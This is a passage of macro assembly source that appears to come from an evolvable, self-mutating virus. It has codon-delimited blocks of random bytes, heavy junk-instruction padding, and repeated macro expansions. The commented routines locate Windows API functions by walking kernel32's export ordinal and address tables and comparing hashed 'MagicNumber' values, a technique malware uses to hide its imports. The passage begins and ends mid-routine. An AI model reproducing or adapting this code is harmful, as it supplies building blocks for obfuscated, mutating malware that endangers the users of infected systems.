    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                               _save                ; BC2=0xFF
                               _pop                 ; BC1=???n
                               _and                 ; BC1=000n
db StopCodon
db 44
db 45
db 205
db 210
db 190
db 184
db 92
db 47
db 216
db 95
db 241
db 45
db StartCodon
                               _JnzUp
db StopCodon
db StartCodon
    _getDO
    BigNum=APITmpBuffer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 210
db 102
db 129
db 147
db 19
db 118
db 15
db 168
db 125
db 213
db 239
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                               _saveWrtOff
                               _nopsA
                               _writeDWord          ; mov dword[APITmpBuffer], RegA
                       _popall
db StopCodon
db 203
db 199
db 5
db 218
db 76
db 128
db 66
db 210
db 5
db 209
db 233
db 228
db 253
db 130
db 199
db 186
db StartCodon
    _getDO
    BigNum=APITmpBuffer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 153
db 37
db 31
db 162
db StartCodon
        _save
        _and
        _popall
    end if
                       _getdata
                       _nopdB              ; save MagicNumber of this API
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=0x0FFF
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _save                ; save 0x0FFF in BC2
db StopCodon
db 149
db 38
db 3
db 151
db 7
db 218
db 106
db 10
db 177
db 127
db 241
db 145
db 94
db 166
db 28
db 126
db 170
db 191
db 13
db 143
db 33
db 56
db 178
db 226
db 48
db 232
db 242
db 204
db 187
db 78
db 247
db 176
db 115
db 13
db 230
db 158
db 187
db 156
db 218
db 82
db 113
db 110
db 124
db 81
db 155
db 55
db 190
db 118
db 203
db 183
db 195
db 223
db 122
db 96
db 71
db 27
db 92
db 82
db 98
db 249
db 245
db 218
db 179
db 147
db 101
db 105
db 115
db 122
db 231
db 254
db 252
db 92
db 148
db 131
db 149
db 41
db 123
db 251
db StartCodon
                       _nopsB
db StopCodon
db 112
db 224
db 12
db 130
db 48
db 112
db 40
db 11
db 171
db 90
db 104
db 63
db 17
db 189
db 99
db 214
db 200
db 238
db 93
db 14
db 116
db 44
db 102
db 14
db 85
db 96
db 174
db 26
db 195
db 54
db 188
db 225
db 176
db 232
db 51
db 25
db 39
db 187
db 136
db 173
db 43
db 171
db 81
db 129
db 74
db 19
db 133
db 53
db 137
db 175
db StartCodon
                       _and                 ; BC1=dword[MagicNumberOfThisAPI] && 0x0FFF
db StopCodon
db 88
db 75
db 105
db 132
db 206
db 193
db 241
db StartCodon
                       _nopdB
                       _nopsD               ; Get Pointer to API MagicWord
                       _getdata
                       _and                 ; BC1=dword[MagicNumberSearchAPI] && 0x0FFF
                       _save                ; save
                       _nopsB               ; Get MagicNumber of current API again
                       _xor                 ; (dword[MagicNumberSearchAPI] && 0x0FFF) XOR dword[MagicNumberOfThisAPI] && 0x0FFF
                                            ; If zero, assume that we found API
                   _JnzUp
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 150
db 171
db 53
db 181
db 157
db 46
db 126
db 238
db 14
db 220
db 56
db 196
db 181
db 186
db 13
db 69
db 247
db 44
db 221
db 198
db 218
db 214
db 145
db 212
db 232
db 163
db 66
db 158
db 155
db 239
db 220
db 241
db 205
db 0
db 27
db 150
db 208
db 71
db 120
db 34
db 42
db 159
db 54
db 156
db 225
db 160
db 25
db 143
db 197
db 55
db 21
db 216
db 224
db 143
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _save                ; BC2=1
                       _pop                 ; Get Counter from Stack
                       _shl                 ; BC1=counter*2 (because Ordinal Table has just 2byte Entries)
                                               ; (=no DLLs with more than 65535 functions?!)
                       _save
    _getDO
    BigNum=hOrdinalTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 159
db 28
db 137
db 192
db 252
db 137
db 7
db 103
db 66
db 227
db 95
db 161
db 133
db 158
db 250
db 217
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
                       _addsaved            ; Points to ordinal number of the API
                       _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0xFFFF
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _save
                       _pop                 ; BC2=0xFFFF
                       _getdata             ; BC1=Ordinal Number of API
                                               ; Ordinal Number is a word, so we have to set the high word to zero
                       _and                 ; BC1=dword[Ordinal] && 0xFFFF
                       _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=2
    AlreadyStarted=0
db StopCodon
db 111
db 22
db 68
db 76
db 77
db 191
db 78
db 197
db 20
db 87
db 43
db 32
db 140
db 120
db 222
db 136
db 167
db 58
db 43
db 161
db 124
db 253
db 76
db 210
db 99
db 21
db 19
db 131
db 168
db 19
db 149
db 160
db 202
db 223
db 140
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 203
db 228
db 208
db 19
db 214
db 163
db 95
db 244
db 68
db 218
db 75
db 54
db 242
db 249
db 7
db 226
db StartCodon
        _save
        _and
        _popall
    end if
                       _save
db StopCodon
db 194
db 103
db 206
db 115
db 199
db 87
db 45
db 240
db 157
db 161
db 174
db 108
db 102
db 197
db 14
db 70
db 41
db 27
db 94
db 96
db 179
db 34
db 140
db 46
db 158
db 126
db 90
db 161
db 38
db 81
db 58
db 220
db 99
db 117
db 30
db 179
db 216
db 147
db 171
db 190
db 11
db 207
db 38
db 186
db 143
db 209
db 196
db 233
db 30
db 222
db 131
db 231
db StartCodon
                       _pop
                       _shl                 ; BC1=Ordinal*4, as Addresse to Function is a dword
                       _save
    _getDO
    BigNum=hAddressTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 99
db 201
db 176
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
                       _addsaved            ; BC1 points to Addresse of API Function
                       _getdata             ; BC1=Addresse of API Function
                       _save
    _getDO
    BigNum=hDLLlibrary32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 219
db 230
db 116
db 81
db 55
db 78
db 196
db 148
db 97
db 247
db 62
db 82
db 151
db 28
db 230
db 171
db 108
db 189
db 201
db 69
db 224
db 160
db 146
db 45
db 16
db 45
db 158
db 155
db 88
db 19
db 47
db 63
db 62
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 10
db 10
db 151
db 247
db 214
db 162
db 122
db 209
db 196
db 210
db 195
db 163
db 225
db 62
db 226
db 28
db 89
db 20
db 14
db 232
db 9
db 39
db 193
db 123
db 148
db 101
db 67
db 132
db 66
db 16
db 224
db 56
db 15
db 99
db 77
db 71
db 255
db 175
db 11
db 155
db 222
db 8
db 42
db 126
db 28
db 60
db 59
db 201
db 247
db 71
db 22
db 87
db 53
db 34
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata
                       _addsaved            ; relative -> absolut
                                               ; BC1 contains the Addresse of the API in (kernel32) memory
                       _nopdB              ; save the Addresse in RegB
    _getDO
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=hAddressePointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 128
db 175
db 90
db 132
db 116
db 148
db 216
db 203
db 255
db 206
db 37
db 244
db 26
db 252
db 166
db 106
db 205
db 203
db 147
db 32
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
                       _getdata             ; Pointer to the buffer where we save the API addresse
                       _saveWrtOff          ; We will write to this Addresse
                       _nopsB               ; restore API Addresse
                       _writeDWord          ; Save the API Function Addresse in the Function Buffer!!!
               _popall
    _getDO
    BigNum=hAddressePointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 164
db 170
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _saveWrtOff      ; The buffer where we save the pointer
               _nopsA
db StopCodon
db 35
db 60
db 99
db 147
db 190
db 187
db 148
db 49
db 36
db 49
db 58
db 38
db 151
db 180
db 147
db 188
db 58
db 39
db StartCodon
    BigNum=0x4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 189
db 168
db 107
db 251
db 241
db 77
db 65
db 106
db 51
db 36
db 34
db 30
db 0
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _writeDWord      ; save pointer
               _nopdA           ; save different (prevents a more messy code)
               _nopsD           ; Next Magic Number for API
    BigNum=0x4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
